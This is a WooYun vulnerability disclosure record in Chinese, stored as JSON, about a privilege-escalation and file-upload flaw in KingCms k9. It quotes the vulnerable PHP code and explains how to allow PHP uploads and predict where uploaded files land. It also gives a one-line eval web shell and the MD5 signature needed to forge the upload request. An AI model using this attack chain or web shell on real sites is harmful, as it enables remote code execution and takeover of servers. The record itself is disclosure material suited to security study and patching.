{"id": 36285, "wybug_id": "wooyun-2015-0102234", "wybug_title": "KingCms最新版（k9）越权操作可轻松GetShell#2", "wybug_corp": "KingCms", "wybug_author": "路人甲", "wybug_date": "2015-03-19 14:28", "wybug_open_date": "2015-05-03 14:30", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-19：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KingCms最新版（k9）越权操作可轻松GetShell#2 详细说明：  朋友的公司想购买kingcms的授权，让我帮忙看下。发现kingcms很长一段时间没更新了，憋了一段时间放出了最新版的k9，官网下下来学习一下。在wooyun上看到了几个漏洞，如： WooYun: kingcms最新版sql注入漏洞 来看看这次shell是如何发生的吧，此漏洞一共涉及到两个大的问题，一个是越权修改后台配置，另一个是文件上传导致GetShell0x00:先来看第一个问题问题文件在/user/manage.php\nfunction _upconfig(){\t$u=new user;$u->auth_role('admin');\tif(!kc_validate($_POST['imagesize'],2)) kc_tip('上传图片上限必须为数字!','form');\tif(!kc_validate($_POST['filesize'],2)) kc_tip('上传文件上限必须为数字!','form');\tif(!kc_validate($_POST['image_width'],2)) kc_tip('自动压缩图片宽度必须为数字!','form');\tif(!kc_validate($_POST['image_height'],2)) kc_tip('自动压缩图片高度必须为数字!','form');\t$db=new db;\t$res=$db->getRows('%s_config','name',\"class='up'\");\tforeach($res as $rs){\t\t$db->update('%s_config',array('value'=>kc_post($rs['name'])),\"class='up' and name='{$rs['name']}'\");//注释1：这里把用户输入的filetype写入了数据库\t}\t$db->update('%s_config',array('value'=>empty($_POST['upfile'])?0:1),\"class='switch' and name='upfile'\");\t$db->update('%s_config',array('value'=>empty($_POST['upimage'])?0:1),\"class='switch' and name='upimage'\");\t$db->update('%s_config',array('value'=>$_POST['image_width']),\"class='system' and name='image_width'\");\t$db->update('%s_config',array('value'=>$_POST['image_height']),\"class='system' and name='image_height'\");\tkc_ajax(array('JS'=>\"\\$.kc_close();alert('成功更新上传设置!');\\$('.Submit').removeAttr('disabled');\"));}\n上面代码中的“注释1”处，把用户提交的filetype写入了数据库，如果用户提交的filetype为php的话，那就可以上传php文件了。过程如图\n\n0x01：再来看看文件是怎么上传的\n$err = \"\";$msg = \"''\";$u=new user;if($u->auth_group('user_upfile',true)==false) $err='您所在会员组会员无权上传文件';$userid=$u->info['userid'];$upfile=@$_FILES[$inputname];if(!isset($upfile))$err='文件域的name错误';elseif(!empty($upfile['error'])){\t无关代码}elseif(empty($upfile['tmp_name']) || $upfile['tmp_name'] == 'none')$err = '无文件上传';else{\t$temppath=$upfile['tmp_name'];\t$extension=strtolower(substr($upfile['name'],strrpos($upfile['name'],'.')+1));\techo str_replace(',','|',$upext);\tif(preg_match('/'.str_replace(',','|',$upext).'/i',$extension))\t{\t\t\t\t$maxattachsize=5242880;\t\t$bytes=$upfile['size'];//filesize($temppath);\t\tif($bytes > $maxattachsize)$err='请不要上传大小超过'.formatBytes($maxattachsize).'的文件';\t\telse\t\t{\t\t\t//创建目录\t\t\t$attach_subdir =gmdate('y/m/d');\t\t\t$attach_dir = PATH_UP.'/'.$attach_subdir;\t\t\t$attach_subdirs=explode('/',$attach_subdir);\t\t\t$attach_temp=ROOT.PATH_UP;\t\t\tforeach($attach_subdirs as $r){\t\t\t\t$attach_temp.='/'.$r;\t\t\t\tif(!is_dir($attach_temp))\t\t\t\t{\t\t\t\t\t@mkdir($attach_temp, 0777);\t\t\t\t\t@fclose(fopen($attach_temp.'/index.html', 'w'));\t\t\t\t}\t\t\t}\t\t\tPHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);\t\t\t$filename=gmdate(\"His\").mt_rand(1000,9999).'.'.$extension;\t\t\t$target = $attach_dir.'/'.$filename;\t\t\t//rename($upfile['tmp_name'],ROOT.$target);\t\t\trename($temppath,ROOT.$target);无关代码\n整个上传的过程简单来说是这样实现的：1：获取允许上传的文件类型2：获取上传文件的类型3：判断文件是否允许上传（因为修改了配置，所以这里php文件是可以上传的）4：上传后文件的路径5：上传后文件的名字然后分析第4、5步，可以得到文件上传的路径是以当前时间定义的，比如今天是2015-03-16，上传后文件的路径是/upfiles/15/03/16,文件是名字也是根据gmdate()获得格林威治时间，然后再加四位随机数，当然文件上传后可以通过文件属性获得其路径，也可以遍历这4个随机数（毕竟样本太少了，秒遍历啊）。上传个php文件看看，内容为\n<?php eval($_POST[\"p\"]);?>\n注意，URL中的一个参数SIGN是这样计算出来的\n<?php$str=\"10000\";//10000即POST参数中的USERID$str.=\"kingcms.com\";//网站域名$SIGN=md5($str);?>\n\n\n上传成功后就可以为所欲为了，大马、菜刀…，这里测试一下吧\n\n   漏洞证明：  见 详细说明   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}